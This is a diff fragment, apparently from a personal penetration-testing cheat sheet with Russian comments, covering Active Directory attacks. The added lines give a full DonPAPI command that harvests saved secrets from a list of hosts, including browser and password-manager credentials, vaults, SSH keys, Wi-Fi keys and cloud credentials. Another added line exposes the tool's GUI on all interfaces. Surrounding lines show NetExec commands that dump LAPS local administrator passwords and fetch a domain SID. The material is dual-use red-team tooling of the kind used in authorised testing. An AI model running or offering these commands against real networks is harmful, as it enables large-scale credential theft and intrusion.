@@ -131,6 +131,11 @@
 					DonPAPI.py domain/user:passw0rd@target
 					donpapi gui
 
+
+					donpapi collect -d DOMAIN -u USERNAME -p PASSWORD -c Certificates,Chromium,CloudCredentials,CredMan,Firefox,IDEProjects,MRemoteNG,MobaXTerm,NotepadPP,PasswordManagers,PowerShellHistory,RDCMan,SCCM,SSHSecrets,VNC,Vaults,VersionControlSystems,Wam,Wifi -t 445_IP_FILE_LIST
+					donpapi gui --bind 0.0.0.0
+
+
 		(пароли локальных администраторов)	nxc ldap dc -u administrator -p password -d . -M laps		
 		
 		(получить sid домена)	nxc ldap dc1.corp.com -u 'administrator' -p 'password' -k --get-sid	
